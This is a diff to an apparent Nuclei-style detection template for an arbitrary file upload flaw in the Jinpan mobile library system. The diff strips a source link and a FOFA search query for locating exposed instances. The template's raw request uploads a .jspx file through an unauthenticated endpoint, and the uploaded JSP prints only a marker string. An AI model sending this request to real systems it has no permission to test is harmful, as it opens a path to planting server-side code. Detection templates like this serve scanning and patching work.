@@ -3,12 +3,8 @@ info:
   name: 金盘移动图书馆系统 前台任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nnnw5alnw4sibwgd'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nnnw5alnw4sibwgd
-    fofa: app="金盘软件-金盘移动图书馆系统"
 http:
 - raw:
   - 'POST /common/upload/upload HTTP/1.1
@@ -38,14 +34,10 @@ http:
     Connection: close
 
 
-
-
     --399e563f0389566bd40fd4d6409a67dd
 
 
     Content-Disposition: form-data; name="file"; filename="dudesite.jspx"
-
-
 
 
     <% out.println("dudesite"); %>
